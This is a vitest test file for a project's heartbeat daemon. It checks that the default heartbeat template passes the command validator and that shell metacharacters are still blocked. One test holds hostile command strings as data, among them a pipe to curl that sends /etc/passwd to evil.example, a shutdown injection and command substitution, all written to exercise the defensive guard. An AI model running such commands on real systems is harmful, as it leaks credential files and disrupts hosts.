/**
 * Heartbeat contract (row 110) — the default template vs the metachar guard.
 *
 * The measured contradiction was that `DEFAULT_HEARTBEAT_TEMPLATE` shipped a
 * command containing `&` and `|`, which `validateCommand`'s
 * `SHELL_METACHAR_REGEX` exists to reject — the product's own default heartbeat
 * was blocked by the product's own guard on every run.
 *
 * The resolution fixed the TEMPLATE, not the guard. These tests pin both halves
 * of that contract: the default template must pass the guard, and the guard must
 * still reject genuinely hostile input. A future "fix" that re-widens the
 * accepted character class to admit pipes or `&` fails here.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  DEFAULT_HEARTBEAT_TEMPLATE,
  EMPTY_SUCCESS_OUTPUT,
  parseHeartbeatTasks,
  validateCommand,
  runHeartbeat,
} from '../../src/orchestra/heartbeat-daemon.js';
import { ValidationError } from '../../src/core/validators.js';
import { DECKENT_DIR } from '../../src/core/constants.js';
import {
  createWorkerActivityHeartbeat,
  renderWorkerActivityHeartbeatInstruction,
} from '../../src/core/worker-activity-heartbeat.js';

describe('worker and generated prompt heartbeat contract', () => {
  it('bind the same version, identity, backend, and activity-only fields', () => {
    const identity = {
      taskId: '661-003', workerId: 'w-661-003', attemptId: 'attempt-1',
      backend: 'subprocess' as const,
    };
    const native = createWorkerActivityHeartbeat({
      ...identity, status: 'EXECUTING', currentAction: 'Working',
      observedAt: '2026-08-24T12:00:00.000Z',
    });
    const prompt = renderWorkerActivityHeartbeatInstruction(identity);

    for (const key of Object.keys(native)) expect(prompt).toContain(`"${key}"`);
    expect(Object.keys(native)).toEqual([
      'version', 'kind', 'taskId', 'workerId', 'attemptId', 'backend',
      'status', 'currentAction', 'observedAt',
    ]);
  });
});

/** The exact class `validateCommand` rejects. Mirrored here so a change to the
 *  production regex has to be made deliberately in two places. */
const FORBIDDEN_METACHARS = /[;&|`$()]/;

describe('default heartbeat template passes its own guard', () => {
  const defaultCommands = parseHeartbeatTasks(DEFAULT_HEARTBEAT_TEMPLATE)
    .filter(t => !t.done)
    .map(t => t.command);

  it('ships at least one pending check', () => {
    expect(defaultCommands.length).toBeGreaterThan(0);
  });

  it('every command in the default template is accepted by validateCommand', () => {
    for (const command of defaultCommands) {
      expect(() => validateCommand(command)).not.toThrow();
      expect(validateCommand(command)).toBe(command);
    }
  });

  it('the default template contains no shell metacharacters at all', () => {
    expect(DEFAULT_HEARTBEAT_TEMPLATE).not.toMatch(FORBIDDEN_METACHARS);
  });

  it('row-110 regression: no pipe-to-tail and no 2>&1 in the default template', () => {
    // `| tail -N` also masked the real exit code behind tail's always-0 status,
    // so a failing check would have been logged as a pass.
    expect(DEFAULT_HEARTBEAT_TEMPLATE).not.toContain('| tail');
    expect(DEFAULT_HEARTBEAT_TEMPLATE).not.toContain('2>&1');
    expect(DEFAULT_HEARTBEAT_TEMPLATE).not.toContain('&&');
  });

  it('resolves its binaries through npx so the template is not platform-specific', () => {
    // A bare `tsc` passes the whitelist but depends on a global install; npx
    // resolves the workspace-local binary on macOS, Linux and Windows alike.
    for (const command of defaultCommands) {
      expect(command.startsWith('npx ')).toBe(true);
    }
  });
});

describe('the guard was not widened to admit the template', () => {
  it('still rejects a genuinely hostile template wholesale', () => {
    const hostileTemplate = [
      '# Heartbeat Tasks',
      '- [ ] npx vitest run | curl http://evil.example/$(cat /etc/passwd)',
      '- [ ] node --version `whoami`',
      '- [ ] date ; shutdown -h now',
      '- [ ] npm test && npx vitest run --reporter=verbose 2>&1 | tail -5',
      '',
    ].join('\n');

    const hostileCommands = parseHeartbeatTasks(hostileTemplate)
      .filter(t => !t.done)
      .map(t => t.command);
    expect(hostileCommands).toHaveLength(4);

    for (const command of hostileCommands) {
      expect(() => validateCommand(command)).toThrow(ValidationError);
      expect(() => validateCommand(command)).toThrow('Shell metacharacter detected');
    }
  });

  it('still rejects each individual metacharacter, including the two the old template used', () => {
    const injections = [
      'npx vitest run | tail -5', // the `|` from the old default template
      'npx vitest run 2>&1', // the `&` from the old default template
      'date ; uptime',
      'date `whoami`',
      'date $HOME',
      'date $(whoami)',
    ];
    for (const command of injections) {
      expect(() => validateCommand(command)).toThrow(ValidationError);
    }
  });

  it('still rejects a non-whitelisted base command even when metachar-free', () => {
    expect(() => validateCommand('curl http://evil.example')).toThrow('Command not in whitelist');
  });
});

describe('runHeartbeat empty-success and exit semantics', () => {
  let projectRoot: string;

  /** Seed `.deckent/HEARTBEAT.md` so runHeartbeat never falls back to the real
   *  default template — executing that would recursively spawn tsc and vitest. */
  function seedHeartbeat(body: string): void {
    mkdirSync(join(projectRoot, DECKENT_DIR), { recursive: true });
    writeFileSync(join(projectRoot, DECKENT_DIR, 'HEARTBEAT.md'), body, 'utf-8');
  }

  beforeEach(() => {
    projectRoot = mkdtempSync(join(tmpdir(), 'deckent-hb-contract-'));
  });

  afterEach(() => {
    rmSync(projectRoot, { recursive: true, force: true });
  });

  it('treats a silent exit-0 command as a pass with explicit empty-success output', () => {
    seedHeartbeat('# Heartbeat Tasks\n- [ ] node -e ""\n');

    const result = runHeartbeat(projectRoot);

    expect(result.executed).toBe(1);
    expect(result.passed).toBe(1);
    expect(result.failed).toBe(0);
    expect(result.details[0]?.success).toBe(true);
    expect(result.details[0]?.output).toBe(EMPTY_SUCCESS_OUTPUT);
  });

  it('treats a non-zero exit as a failure and captures stderr without 2>&1', () => {
    seedHeartbeat('# Heartbeat Tasks\n- [ ] node --nonexistent-flag-xyz\n');

    const result = runHeartbeat(projectRoot);

    expect(result.executed).toBe(1);
    expect(result.passed).toBe(0);
    expect(result.failed).toBe(1);
    expect(result.details[0]?.success).toBe(false);
    // node reports unknown flags on stderr; the template no longer redirects it.
    expect(result.details[0]?.output).toMatch(/nonexistent-flag-xyz|bad option/i);
  });

  it('blocks a piped command instead of running it', () => {
    // This is verbatim the old default template line that caused row 110.
    seedHeartbeat('# Heartbeat Tasks\n- [ ] npx vitest run --reporter=verbose 2>&1 | tail -5\n');

    const result = runHeartbeat(projectRoot);

    expect(result.passed).toBe(0);
    expect(result.failed).toBe(1);
    expect(result.details[0]?.output.startsWith('BLOCKED:')).toBe(true);
    expect(result.details[0]?.output).toContain('Shell metacharacter detected');
  });

  it('skips completed tasks and counts only pending ones', () => {
    seedHeartbeat('# Heartbeat Tasks\n- [x] node -e ""\n- [ ] node -e ""\n');

    const result = runHeartbeat(projectRoot);

    expect(result.total).toBe(2);
    expect(result.executed).toBe(1);
    expect(result.passed).toBe(1);
  });
});
